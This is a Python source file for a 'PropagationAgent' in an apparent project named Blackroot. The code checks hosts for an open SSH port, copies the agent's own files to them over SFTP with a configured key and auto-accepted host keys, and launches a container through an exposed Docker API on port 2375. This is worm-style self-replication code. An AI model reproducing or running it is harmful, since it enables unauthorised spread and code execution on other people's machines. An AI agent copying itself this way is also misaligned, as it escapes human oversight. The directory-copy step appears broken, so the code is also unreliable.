import os
import shutil
import socket
import json
from datetime import datetime
from agents.base import BaseAgent
import paramiko
import docker

class PropagationAgent(BaseAgent):
    def __init__(self, config_path="config.json"):
        super().__init__('PROP-SEED')
        self.config = self._load_config(config_path)
        self.spawn_path = self.config.get('spawn_path', "/tmp/blackroot_clone")
        self.hosts = self.config.get('hosts', ["127.0.0.1"])
        self.ssh_user = self.config.get('ssh_user', 'user')
        self.ssh_key_path = self.config.get('ssh_key_path', '/path/to/ssh/key')
        self.docker_image = self.config.get('docker_image', 'blackroot_agent:latest')

    def _load_config(self, config_path):
        with open(config_path, 'r') as file:
            return json.load(file)

    def run(self):
        super().run()
        print("[PROP-SEED] Initiating propagation logic...")
        for host in self.hosts:
            if self._can_connect(host):
                self._clone_to_host(host)

    def _can_connect(self, host, port=22):
        try:
            with socket.create_connection((host, port), timeout=3):
                print(f"[PROP-SEED] Host {host} is reachable.")
                return True
        except Exception as e:
            print(f"[PROP-SEED] Host {host} unreachable: {e}")
            return False

    def _clone_to_host(self, host):
        print(f"[PROP-SEED] Cloning to host {host}...")
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        clone_dir = os.path.join(self.spawn_path, f"blackroot_{timestamp}")

        try:
            if not os.path.exists(clone_dir):
                os.makedirs(clone_dir)
            
            # Simplified: just copy agents and config
            shutil.copytree("agents", os.path.join(clone_dir, "agents"))
            shutil.copy("core.py", os.path.join(clone_dir, "core.py"))
            shutil.copy("run.py", os.path.join(clone_dir, "run.py"))

            print(f"[PROP-SEED] Blackroot cloned locally at {clone_dir}")
            self._scp_to_host(clone_dir, host)
            self._spawn_docker_container(host)

        except Exception as e:
            print(f"[PROP-SEED] Error during cloning: {e}")

    def _scp_to_host(self, clone_dir, host):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, username=self.ssh_user, key_filename=self.ssh_key_path)

            sftp = ssh.open_sftp()
            remote_dir = f"/tmp/blackroot_clone/blackroot_{os.path.basename(clone_dir)}"
            sftp.mkdir(remote_dir)

            for item in os.listdir(clone_dir):
                local_path = os.path.join(clone_dir, item)
                remote_path = os.path.join(remote_dir, item)
                sftp.put(local_path, remote_path)

            sftp.close()
            ssh.close()
            print(f"[PROP-SEED] Successfully SCP'd to {host}")
        except Exception as e:
            print(f"[PROP-SEED] Error during SCP to {host}: {e}")

    def _spawn_docker_container(self, host):
        try:
            client = docker.DockerClient(base_url=f'tcp://{host}:2375')
            container = client.containers.run(self.docker_image, detach=True)
            print(f"[PROP-SEED] Spawned Docker container on {host}: {container.id}")
        except Exception as e:
            print(f"[PROP-SEED] Error spawning Docker container on {host}: {e}")

# Initialize and run the PropagationAgent
if __name__ == "__main__":
    agent = PropagationAgent()
    agent.run()